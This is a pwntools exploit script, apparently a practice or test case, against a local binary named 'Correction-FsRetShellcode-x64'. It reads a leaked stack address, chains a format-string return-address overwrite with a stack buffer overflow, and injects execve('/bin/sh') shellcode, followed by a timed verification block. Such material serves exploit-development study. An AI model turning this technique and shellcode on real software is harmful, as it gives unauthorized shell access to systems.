from pwn import *
import time
import sys
import signal
import sf

target = process("./Correction-FsRetShellcode-x64")
gdb.attach(target, execute="verify_exploit")

bof_payload = sf.BufferOverflow(arch=64)

target.recvuntil("Tell me I was never good enough: ")
leak = int(target.recvuntil(b"\n").strip(b"\n"), 16)
ret_address = leak + (520)
fs = sf.WriteFmtStr(
		arch = 64,
		value = -0x1b0,
		address = 0x0,
		offset = 0x6,
		printed_bytes = 0x0,
		alignment_bytes = 0x0,
		value_base = ret_address,
		address_base = ret_address)

payload = sf.BufferOverflow(arch=64, start=520)
payload.add_bytes(520, fs.generate_fmt_str())
payload.add_bytes(432, b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")
target.sendline(payload.generate_payload())

# Exploit Verification starts here 15935728

def handler(signum, frame):
	raise Exception("Timed out")

signal.signal(signal.SIGALRM, handler)
signal.alarm(2)

try:
	while True:
		target.recvall(timeout=2)
except Exception:
	print("Exploit timed out")
